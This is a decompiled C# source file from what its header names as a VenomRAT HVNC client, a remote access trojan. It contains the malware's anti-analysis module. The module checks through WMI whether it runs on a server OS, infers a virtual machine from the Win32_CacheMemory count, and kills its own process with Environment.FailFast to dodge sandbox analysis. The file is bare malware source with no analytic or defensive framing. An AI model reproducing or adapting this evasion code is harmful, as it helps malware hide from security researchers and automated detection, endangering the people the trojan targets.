// Decompiled with JetBrains decompiler
// Type: Client.Helper.Anti_Analysis
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using System;
using System.Linq;
using System.Management;


namespace Client.Helper
{
  internal class Anti_Analysis
  {
    public static void RunAntiAnalysis()
    {
      if (Anti_Analysis.IsServerOS() || !Anti_Analysis.isVM_by_wim_temper())
        return;
      Environment.FailFast((string) null);
    }

    public static bool IsServerOS()
    {
      try
      {
        string machineName = Environment.MachineName;
        ConnectionOptions options = new ConnectionOptions()
        {
          EnablePrivileges = true,
          Impersonation = ImpersonationLevel.Impersonate
        };
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new ManagementScope(string.Format("\\\\{0}\\root\\CIMV2", (object) machineName), options), new ObjectQuery("SELECT * FROM Win32_OperatingSystem")))
        {
          using (ManagementObjectCollection source = managementObjectSearcher.Get())
          {
            if (source.Count != 1)
              throw new ManagementException();
            switch ((uint) source.OfType<ManagementObject>().First<ManagementObject>().Properties["ProductType"].Value)
            {
              case 1:
                return false;
              case 2:
                return true;
              case 3:
                return true;
              default:
                return false;
            }
          }
        }
      }
      catch
      {
        return false;
      }
    }

    public static bool isVM_by_wim_temper()
    {
      try
      {
        ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher((ObjectQuery) new SelectQuery("Select * from Win32_CacheMemory"));
        int num = 0;
        foreach (ManagementObject managementObject in managementObjectSearcher.Get())
          ++num;
        return num < 2;
      }
      catch
      {
        return true;
      }
    }
  }
}
